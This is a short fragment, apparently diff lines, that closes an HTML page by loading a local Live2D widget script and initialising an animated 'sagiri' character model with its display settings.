+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/sagiri.model.json"},"mobile":{"show":false,"scale":0.5},"log":false});</script></body>
+</html>
